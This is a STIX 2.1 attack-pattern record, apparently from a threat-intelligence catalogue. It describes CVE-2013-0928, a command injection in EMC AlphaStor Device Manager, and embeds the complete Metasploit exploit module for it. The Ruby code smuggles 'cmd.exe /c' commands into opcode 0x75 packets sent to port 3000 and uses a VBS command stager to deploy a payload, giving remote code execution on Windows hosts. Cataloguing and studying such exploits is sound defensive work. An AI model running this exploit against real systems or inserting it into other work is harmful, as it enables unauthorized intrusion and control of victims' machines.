{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24a9d74a-57a0-4050-949b-167225c215d9",
    "created": "2024-08-14T16:48:09.231618Z",
    "modified": "2024-08-14T16:48:09.231622Z",
    "name": "EMC AlphaStor Device Manager Opcode 0x75 Command Injection",
    "description": " This module exploits a flaw within the Device Manager (rrobtd.exe). When parsing the 0x75 command, the process does not properly filter user supplied input allowing for arbitrary command injection. This module has been tested successfully on EMC AlphaStor 4.0 build 116 with Windows 2003 SP2 and Windows 2008 R2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/emc/alphastor_device_manager_exec.rb",
            "external_id": "alphastor_device_manager_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0928"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'EMC AlphaStor Device Manager Opcode 0x75 Command Injection',\n      'Description'     => %q{\n        This module exploits a flaw within the Device Manager (rrobtd.exe). When parsing the 0x75\n        command, the process does not properly filter user supplied input allowing for arbitrary\n        command injection. This module has been tested successfully on EMC AlphaStor 4.0 build 116\n        with Windows 2003 SP2 and Windows 2008 R2.\n      },\n      'Author'          =>\n        [\n          'Anyway <Aniway.Anyway[at]gmail.com>',               # Vulnerability Discovery\n          'Preston Thornburn <prestonthornburg[at]gmail.com>', # msf module\n          'Mohsan Farid <faridms[at]gmail.com>',               # msf module\n          'Brent Morris <inkrypto[at]gmail.com>',              # msf module\n          'juan vazquez'                                       # convert aux module into exploit\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          ['CVE', '2013-0928'],\n          ['ZDI', '13-033']\n        ],\n      'Platform'        => 'win',\n      'Arch'            => ARCH_X86,\n      'Payload'         =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Targets'\t=>\n          [\n            [ 'EMC AlphaStor 4.0 < build 800 / Windows Universal', {} ]\n          ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2013-01-18'))\n\n    register_options(\n      [\n        Opt::RPORT(3000)\n      ])\n  end\n\n  def check\n    packet = \"\\x75~ mminfo & #{rand_text_alpha(512)}\"\n    res = send_packet(packet)\n    if res && res =~ /Could not fork command/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    execute_cmdstager({ :linemax => 487 })\n  end\n\n  def execute_command(cmd, opts)\n    padding = rand_text_alpha_upper(489 - cmd.length)\n    packet = \"\\x75~ mminfo &cmd.exe /c #{cmd} & #{padding}\"# #{padding}\"\n    connect\n    sock.put(packet)\n    begin\n      sock.get_once\n    rescue EOFError\n      fail_with(Failure::Unknown, \"Failed to deploy CMD Stager\")\n    end\n    disconnect\n  end\n\n  def execute_cmdstager_begin(opts)\n    if flavor =~ /vbs/ && self.decoder =~ /vbs_b64/\n      cmd_list.each do |cmd|\n        cmd.gsub!(/data = Replace\\(data, vbCrLf, \"\"\\)/, \"data = Replace(data, \\\" \\\" + vbCrLf, \\\"\\\")\")\n      end\n    end\n  end\n\n  def send_packet(packet)\n    connect\n\n    sock.put(packet)\n    begin\n      meta_data = sock.get_once(8)\n    rescue EOFError\n      meta_data = nil\n    end\n\n    unless meta_data\n      disconnect\n      return nil\n    end\n\n    code, length = meta_data.unpack(\"N*\")\n\n    unless code == 1\n      disconnect\n      return nil\n    end\n\n    begin\n      data = sock.get_once(length)\n    rescue EOFError\n      data = nil\n    ensure\n      disconnect\n    end\n\n    data\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-18",
    "x_mitre_platforms": [
        "win'"
    ]
}